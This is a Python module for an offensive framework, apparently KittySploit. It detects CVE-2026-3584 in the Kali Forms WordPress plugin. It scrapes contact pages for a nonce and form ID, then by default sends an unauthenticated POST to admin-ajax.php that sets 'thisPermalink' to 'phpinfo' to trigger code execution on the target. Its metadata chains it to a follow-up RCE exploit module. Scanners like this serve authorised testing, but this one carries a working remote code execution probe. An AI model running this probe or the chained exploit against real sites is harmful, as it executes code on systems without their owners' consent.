#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kali Forms <= 2.4.9 unauthenticated RCE (CVE-2026-3584)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "kali-forms"
_VULN_HIGH = (2, 4, 9)
_FORM_PATHS = ("/contact-us/", "/contact/", "/form/", "/feedback/", "/")
_NONCE_RE = re.compile(r'ajax_nonce":"([a-f0-9]+)"', re.I)
_FORM_ID_RE = re.compile(r'data-form-id="(\d+)"', re.I)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Kali Forms CVE-2026-3584 detect",
        "description": (
            "Detects CVE-2026-3584 via public Kali Forms page and optional "
            "kaliforms_form_process phpinfo probe (thisPermalink)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-3584",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-3584",
            "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/kali-forms/",
        ],
        "modules": ["exploits/multi/http/kali_forms_cve_2026_3584_rce"],
        "tags": ["web", "scanner", "wordpress", "kali-forms", "rce", "cve-2026-3584"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["exploits/multi/http/kali_forms_cve_2026_3584_rce"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    active_rce_probe = OptBool(True, "POST phpinfo via thisPermalink", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _find_form(self):
        for rel in _FORM_PATHS:
            page = self.http_request(method="GET", path=self._join(rel), allow_redirects=True)
            if not page or int(page.status_code or 0) != 200:
                continue
            html = page.text or ""
            if "KaliFormsObject" not in html or "ajax_nonce" not in html:
                continue
            nonce_m = _NONCE_RE.search(html)
            fid_m = _FORM_ID_RE.search(html)
            if nonce_m and fid_m:
                return rel, nonce_m.group(1), fid_m.group(1)
        return None, "", ""

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        path, nonce, form_id = self._find_form()
        if not nonce:
            return False
        if self.active_rce_probe:
            post = self.http_request(
                method="POST",
                path=self._join("/wp-admin/admin-ajax.php"),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data={
                    "action": "kaliforms_form_process",
                    "data[nonce]": nonce,
                    "data[formId]": form_id,
                    "data[first-name]": "test",
                    "data[last-name]": "user",
                    "data[email]": "test@example.com",
                    "data[message]": "test",
                    "data[thisPermalink]": "phpinfo",
                },
                allow_redirects=False,
            )
            body = post.text or "" if post else ""
            if post and int(post.status_code or 0) == 200 and "phpinfo()" in body and "PHP Version" in body:
                self.set_info(
                    severity="critical",
                    reason="Kali Forms kaliforms_form_process RCE confirmed (phpinfo)",
                    path=path,
                    cve="CVE-2026-3584",
                )
                return True
        self.set_info(
            severity="high",
            reason="Kali Forms exposed; version/probe inconclusive",
            path=path,
            cve="CVE-2026-3584",
        )
        return True
